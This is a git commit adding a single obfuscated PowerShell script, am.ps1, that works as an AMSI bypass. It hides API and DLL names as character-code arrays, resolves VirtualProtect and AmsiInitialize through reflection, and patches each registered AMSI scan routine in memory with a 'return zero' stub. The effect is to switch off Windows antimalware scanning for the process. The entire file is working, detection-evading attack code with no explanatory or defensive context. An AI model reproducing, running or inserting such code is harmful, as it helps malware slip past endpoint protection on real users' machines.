42fc4650d0d0f5944689e37ee0bcd47a78799b1e
etc3p <51124059+etc3p@users.noreply.github.com>
2024-06-18 20:42:35 +0300

    Add files via upload

---
+++ am.ps1
@@ -0,0 +1,49 @@
+function 6p2oHgiYr8jlf8blegF ($nOY06i22QqnBGUfuRQngDRiOVMS, $hHtxgkRzV0co7lXqr4ijIwVx1Gsf){
+	$l9ZYBuswowvymiK47ZRUoE9sqj = (([ApPdomAIn]::"$(''::nEW((99, 85, 114, 114, 101, 110, 84, 68, 79, 109, 65, 73, 110)))".GetassEmBlies() | ? {$_.GloBalaSSembLYcAChe -anD $_."$([TExT.enCoDInG]::'asCII'.'GetstRinG'((76, 111, 99, 97, 84, 105, 111, 78)))"."$([SysTem.TeXt.ENcODinG]::'asciI'.'GEtsTrINg'((0x73, 0x70, 0x6c, 0x49, 0x54)))"([SYstEM.TeXT.encoDiNG]::asCII.'GeTSTrIng'((0x5c, 0x5c)))[-1] -EQ [SystEM.TEXt.ENcoDIng]::AsCII.gETsTRing((0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x64, 0x6c, 0x6c))}).gEttypEs() | ? { $_.NAmE -Eq [SYstEM.texT.encoding]::ASCiI.geTstRInG((0x55, 0x6e, 0x73, 0x61, 0x66, 0x65, 0x4e, 0x61, 0x74, 0x69, 0x76, 0x65, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x73))})[0]
+	$wPBq8koaBO9M32tKf = $l9ZYBuswowvymiK47ZRUoE9sqj."$(''::NeW((71, 101, 84, 109, 101, 116, 72, 79, 100, 115)))"()
+	$eFRpMx5UV7cJ9hSSKO = $wPBq8koaBO9M32tKf | ? {$_.nAMe -eQ [sYSteM.tEXt.eNCOding]::AscIi.'GeTsTRiNG'((71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115)) -And $_."$(''::nEW((103, 69, 84, 112, 65, 114, 97, 109, 101, 116, 69, 114, 83)))"()[0]."$(''::neW((112, 65, 82, 65, 109, 101, 116, 69, 82, 116, 121, 80, 69)))" -eQ [System.RUNtImE.interopseRVicES.hAndlereF]}
+	$usuxryA8Mu1vnl0DT = $wPBq8koaBO9M32tKf | ? {$_."$(''::NeW((110, 97, 77, 69)))" -eq ''::neW((0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65))}
+	$tJKrEH6AgooqIHmRRTuTs4ycT9cXH = $usuxryA8Mu1vnl0DT."$(''::NeW((0x69, 0x6e, 0x56, 0x6f, 0x4b, 0x65)))"($nULL,@($nOY06i22QqnBGUfuRQngDRiOVMS))
+	$W2fAyXlvlzKDyxtBEYfqF3u = nEw-ObjeCt ([SysTem.text.ENcOdING]::ASCIi.'GETSTriNG'((83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 46, 72, 97, 110, 100, 108, 101, 82, 101, 102)))((nEW-objEcT (''::neW((83, 121, 115, 116, 101, 109, 46, 73, 110, 116, 80, 116, 114)))),$tJKrEH6AgooqIHmRRTuTs4ycT9cXH)
+	return $eFRpMx5UV7cJ9hSSKO.invOKE($NuLl, @($W2fAyXlvlzKDyxtBEYfqF3u, $hHtxgkRzV0co7lXqr4ijIwVx1Gsf))
+}
+function WGEf9to2l0U6WHBXVzp9gx ([TYpe[]] $v5RWnmH66f9DOpmKUKI4LWhWZ, [typE] $AJQADyBoRGYXYfnJt59i = [VOID]){
+	$IbOjBaecu7OExkrB = [apPdOmain]::cUrreNTDOmaIN."$([sysTem.TeXT.encodING]::ASCii.gETSTRinG((100, 69, 102, 105, 110, 69, 68, 89, 78, 97, 109, 105, 99, 65, 115, 83, 101, 109, 98, 108, 89)))"((new-objEct SysteM.rEFLeCtioN.aSseMBLYNamE(''::NeW((0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x65, 0x64, 0x44, 0x65, 0x6c, 0x65, 0x67, 0x61, 0x74, 0x65)))), [SystEM.REFLecTiOn.EmIT.AsSEmbLyBuilDErAcCESS]::"$([teXt.eNCodiNG]::asciI.gETSTrINg((82, 85, 110)))").DefInEdynamiCMOduLe([SYsTEM.TexT.ENCODING]::UtF8.GEtsTring((73, 110, 77, 101, 109, 111, 114, 121, 77, 111, 100, 117, 108, 101)), $FAlSe).dEFiNEtYpE([TEXt.encODInG]::'asCii'.'GEtSTriNG'((0x4d, 0x79, 0x44, 0x65, 0x6c, 0x65, 0x67, 0x61, 0x74, 0x65, 0x54, 0x79, 0x70, 0x65)), [texT.encODIng]::aSCIi.gEtStRINg((67, 108, 97, 115, 115, 44, 32, 80, 117, 98, 108, 105, 99, 44, 32, 83, 101, 97, 108, 101, 100, 44, 32, 65, 110, 115, 105, 67, 108, 97, 115, 115, 44, 32, 65, 117, 116, 111, 67, 108, 97, 115, 115)),[systeM.MuLTIcAstDElEgaTe])
+	$IbOjBaecu7OExkrB.DEFINecOnStrucTor(''::nEw((0x52, 0x54, 0x53, 0x70, 0x65, 0x63, 0x69, 0x61, 0x6c, 0x4e, 0x61, 0x6d, 0x65, 0x2c, 0x20, 0x48, 0x69, 0x64, 0x65, 0x42, 0x79, 0x53, 0x69, 0x67, 0x2c, 0x20, 0x50, 0x75, 0x62, 0x6c, 0x69, 0x63)),[sysTEm.REflECTioN.CALLingCOnvENTIoNs]::STandARd, $v5RWnmH66f9DOpmKUKI4LWhWZ)."$(''::NeW((0x53, 0x45, 0x74, 0x69, 0x6d, 0x50, 0x4c, 0x45, 0x6d, 0x45, 0x6e, 0x74, 0x61, 0x54, 0x49, 0x4f, 0x4e, 0x46, 0x6c, 0x61, 0x47, 0x73)))"([SYsTEm.TExt.enCOdING]::utF8.GETSTRIng((0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x2c, 0x20, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x64)))
+	$IbOjBaecu7OExkrB."$([teXT.eNCoDiNg]::Utf8.GetStRINg((68, 69, 102, 73, 78, 69, 109, 69, 84, 72, 79, 100)))"([sYStem.tExt.ENCODiNg]::'AScII'.'getstRiNg'((0x49, 0x6e, 0x76, 0x6f, 0x6b, 0x65)), [teXt.EncOding]::aSCii.'geTstRING'((0x50, 0x75, 0x62, 0x6c, 0x69, 0x63, 0x2c, 0x20, 0x48, 0x69, 0x64, 0x65, 0x42, 0x79, 0x53, 0x69, 0x67, 0x2c, 0x20, 0x4e, 0x65, 0x77, 0x53, 0x6c, 0x6f, 0x74, 0x2c, 0x20, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c)), $AJQADyBoRGYXYfnJt59i, $v5RWnmH66f9DOpmKUKI4LWhWZ).seTImPlemENTatIONflAGs([tExT.eNcOding]::utf8.getstRIng((82, 117, 110, 116, 105, 109, 101, 44, 32, 77, 97, 110, 97, 103, 101, 100)))
+	return $IbOjBaecu7OExkrB.creatEtYpe()
+}
+[INtPTR]$CdSVS9qv4kdAkKZBGYxIm4 = 6p2oHgiYr8jlf8blegF -nOY06i22QqnBGUfuRQngDRiOVMS (''::nEw((0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c))) -hHtxgkRzV0co7lXqr4ijIwVx1Gsf ([sYsteM.Text.EncOdinG]::aScIi.'gETstRiNg'((0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74)))
+$p55K4trmKbPOHU1 = WGEf9to2l0U6WHBXVzp9gx -v5RWnmH66f9DOpmKUKI4LWhWZ @([inTPtR], [uINt32],[uinT32], [uiNt32].mAKEbyrEfType()) -AJQADyBoRGYXYfnJt59i ([bOol])
+$KoadUa4cMkZp7RX3 = [sYSTeM.rUNTiME.InteroPseRviCes.MArShAl]::"$([SystEM.teXT.eNCOdIng]::asciI.GETstRiNg((0x47, 0x65, 0x74, 0x64, 0x45, 0x4c, 0x45, 0x47, 0x41, 0x74, 0x45, 0x46, 0x4f, 0x72, 0x66, 0x55, 0x6e, 0x63, 0x54, 0x49, 0x6f, 0x4e, 0x50, 0x6f, 0x69, 0x4e, 0x54, 0x65, 0x52)))"($CdSVS9qv4kdAkKZBGYxIm4, $p55K4trmKbPOHU1)
+[iNtPTR]$9uU9RM45yaXhDhZ = 6p2oHgiYr8jlf8blegF -nOY06i22QqnBGUfuRQngDRiOVMS ([TEXT.ENcoDiNg]::'asCii'.geTStRinG((0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c))) -hHtxgkRzV0co7lXqr4ijIwVx1Gsf ([sYSTem.TeXt.EnCodinG]::'aSciI'.gETstRiNg((65, 109, 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)))
+$4uYmkKqAkosNusm = WGEf9to2l0U6WHBXVzp9gx -v5RWnmH66f9DOpmKUKI4LWhWZ @([STrinG], [IntptR]."$(''::New((0x6d, 0x61, 0x4b, 0x45, 0x42, 0x79, 0x52, 0x65, 0x46, 0x54, 0x59, 0x70, 0x65)))"()) -AJQADyBoRGYXYfnJt59i ([INT])
+$lOgZYV82WYksC8rHtnwdB52pIqyzZ = [sySTEM.rUnTIme.iNtERoPSerVIcEs.MARshal]::"$(''::nEW((0x67, 0x45, 0x54, 0x44, 0x45, 0x6c, 0x65, 0x67, 0x41, 0x54, 0x45, 0x66, 0x4f, 0x52, 0x66, 0x75, 0x4e, 0x43, 0x54, 0x49, 0x4f, 0x6e, 0x50, 0x4f, 0x69, 0x6e, 0x54, 0x45, 0x52)))"($9uU9RM45yaXhDhZ, $4uYmkKqAkosNusm)
+[bYTe[]]$wIagePOUiT6ZlUsQ8P = (0x61, 0xd9, 0xd9, 0xd9, 0xd9, 0x1a) | % {$_ -bxor 0xd9}
+$cN7tbtORELvkAzIope5 = 0
+$s63sItFhoYdD8c8IUSZqurVmZys = 0
+iF ([iNTPTr]::"$(''::nEw((0x53, 0x69, 0x5a, 0x65)))" -eq 8){
+	[INt64]$qk7VgFrrkK4ggRMqFa8So3rq5=0
+	$dNkM1JBLX2f0MomHnDDB = 64
+	fUncTION CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 ($jAbg7yWWUO9YodX3QZVrP5Ml5OUa, $bF1ok7tD5ytT43xkTebBq){
+		[sYStem.rUnTimE.iNteRoPseRviCes.mArshAL]::READInt64([iNTPTR]$jAbg7yWWUO9YodX3QZVrP5Ml5OUa,$bF1ok7tD5ytT43xkTebBq)
+	}
+}
+Else {
+	$qk7VgFrrkK4ggRMqFa8So3rq5 = 0
+	$dNkM1JBLX2f0MomHnDDB = 36
+	fuNctIOn CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 ($jAbg7yWWUO9YodX3QZVrP5Ml5OUa, $bF1ok7tD5ytT43xkTebBq){
+		[sySTem.rUNtiME.InTErOpsERVicES.maRshAL]::"$(''::NEW((0x52, 0x65, 0x61, 0x44, 0x69, 0x4e, 0x74, 0x33, 0x32)))"($jAbg7yWWUO9YodX3QZVrP5Ml5OUa+$bF1ok7tD5ytT43xkTebBq)
+	}
+}
+[VOId]$lOgZYV82WYksC8rHtnwdB52pIqyzZ."$([sysTem.TeXt.EncoDInG]::'aSCIi'.GETsTrinG((105, 110, 86, 111, 107, 101)))"(''::new((77, 121, 83, 99, 97, 110, 110, 101, 114)), [ref]$qk7VgFrrkK4ggRMqFa8So3rq5)
+$JRmLjZKAsYetXkheyDiHsrwZYGWk = CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 $qk7VgFrrkK4ggRMqFa8So3rq5 ([InTPtr]::"$(''::nEW((115, 73, 122, 69)))" * 2)
+$ZIzCl3l6dox75xT08TgvN2P = CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 $JRmLjZKAsYetXkheyDiHsrwZYGWk $dNkM1JBLX2f0MomHnDDB
+WhiLE ($ZIzCl3l6dox75xT08TgvN2P -nE 0){
+	$y7LnUj30myZD0Aic1IUrZQnjxnuS = CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 $ZIzCl3l6dox75xT08TgvN2P
+	$xeQpiQ0YzhZMBcQdYKeGNQ = CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 $y7LnUj30myZD0Aic1IUrZQnjxnuS ([InTPTR]::"$([SySTeM.text.encoDing]::UtF8.GEtsTRInG((0x53, 0x69, 0x5a, 0x45)))" * 3)
+	[vOiD]$KoadUa4cMkZp7RX3.inVoKe($xeQpiQ0YzhZMBcQdYKeGNQ, [uiNT32]6, 0x40, [Ref]$cN7tbtORELvkAzIope5)
+	[sYsTeM.rUNTIMe.InteROPsErVicES.marsHAl]::cOPY($wIagePOUiT6ZlUsQ8P, 0, [iNtptr]$xeQpiQ0YzhZMBcQdYKeGNQ ,6)
+	$s63sItFhoYdD8c8IUSZqurVmZys++
+	$ZIzCl3l6dox75xT08TgvN2P = CewhvSeDMwSHU5aS4TUnV4akIr9Hs6 $JRmLjZKAsYetXkheyDiHsrwZYGWk ($dNkM1JBLX2f0MomHnDDB + ($s63sItFhoYdD8c8IUSZqurVmZys * [InTpTR]::"$(''::NeW((115, 73, 90, 101)))"))
+}
